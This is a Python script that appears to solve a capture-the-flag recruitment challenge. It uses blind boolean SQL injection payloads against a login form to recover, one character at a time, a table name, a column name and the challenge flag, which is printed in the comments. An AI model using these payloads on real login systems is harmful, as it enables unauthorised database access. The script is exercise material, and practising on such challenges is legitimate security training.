import requests
import string
# from string import ascii_lowercase
# from string import ascii_uppercase

url = "http://recruit.osiris.cyber.nyu.edu:2002/auth/login"

# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES) -- toofar'
# username = ' \' OR (SELECT * FROM INFORMATION_SCHEMA.TABLES) -- incorrect'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES LIMIT 1) -- toofar'
# username = ' \' OR (SELECT COUNT(1) FROM INFORMATION_SCHEMA.TABLES LIMIT 1) -- toofar'
# username = ' \' OR (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES LIMIT 1) -- incorrect'
# username = ' \' OR (SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'%\') -- incorrect'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'a%\') -- incorrect'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'%\') -- toofar'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'u%\') -- toofar (other letters incorrect)'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'users\') -- toofar'
# username = ' \' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'users_\') -- incorrect'
# username = ' \' OR (SELECT COUNT(1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'users\') -- toofar'
# username = ' \' OR (SELECT COUNT(1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'users\' LIMIT 1) -- toofar'
# username = ' \' OR (SELECT COUNT(1) FROM INFORMATION_SCHEMA.TABLES WHERE COLUMN_NAME LIKE \'users\' LIMIT 1) -- incorrect'
# username = ' \' OR (SELECT COUNT(1) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE \'users\' AND COLUMN_NAME LIKE \'%\' LIMIT 1) -- incorrect'

lower = string.ascii_lowercase
upper = string.ascii_uppercase
# total = lower+upper
total = lower+'1'+'2'+'3'+'4'+'5'+'6'+'7'+'8'+'9'+'0'

def split(list):
    return [char for char in list]

total_array = split(total)
total_array.append('_')
total_array.append('{')
total_array.append('}')
total_array.append('@')

# print(total_array)

# for x in total_array:
    # username = " ' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '"+x+"%') -- "
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'i"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'it"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_i"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in_"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in_h"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in_he"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in_her"+x+"%') -- BOOM! e"
    # username = " ' OR EXISTS(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 'its_in_here"+x+"%') -- solution"
    # auth = {'username':username, 'password':'asd'}
    # response = requests.post(url, auth)
    # if "stranger" in response.text:
    #     print(x)


# username = " ' OR EXISTS(SELECT * FROM its_in_here) -- toofar"
# auth = {'username':username, 'password':'asd'}
# response = requests.post(url, auth)
# if "stranger" in response.text:
#     print("true")
# else:
#     print("false")


# for y in range(1,10):
#     username = " ' OR EXISTS(SELECT * FROM its_in_here WHERE COLUMN LIKE '"+x+"%') -- incorrect"
#     username = " ' OR EXISTS(SELECT * FROM its_in_here WHERE COLUMN_NAME LIKE '"+x+"%') -- incorrect"
#     username = " ' OR EXISTS(SELECT COLUMNS("+str(y)+") FROM its_in_here) -- ' "
#     auth = {'username':username, 'password':'asd'}
#     response = requests.post(url, auth)
#     if "stranger" in response.text:
#         print("true")
#     else:
#         print("false")

# for x in total_array:
    # username = " ' OR EXISTS(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'its_in_here' AND COLUMN_NAME LIKE 'f"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'its_in_here' AND COLUMN_NAME LIKE 'fl"+x+"%') -- BOOM!"
    # username = " ' OR EXISTS(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'its_in_here' AND COLUMN_NAME LIKE 'fla"+x+"%') -- BOOM! g"
    # username = " ' OR EXISTS(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'its_in_here' AND COLUMN_NAME LIKE 'flag"+x+"%') -- solution!"
    # auth = {'username':username, 'password':'asd'}
    # response = requests.post(url, auth)
    # if "stranger" in response.text:
    #     print(x)

for x in total_array:
    # username = " ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'its_in_here' AND COLUMN_NAME = 'flag' AND flag = '"+x+"%') -- "
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE '"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'f"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{0"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{0h"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{0h_"+x+"%') -- BOOM! }"
    #....
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{0h_8oy_7h@7_wa2_h@rd"+x+"%') -- BOOM! }"
    # username = " ' OR EXISTS(SELECT flag FROM its_in_here WHERE flag LIKE 'flag{0h_8oy_7h@7_wa2_h@rd}"+x+"%') -- solution!"

    auth = {'username':username, 'password':'asd'}
    response = requests.post(url, auth)
    if "stranger" in response.text:
        print(x)
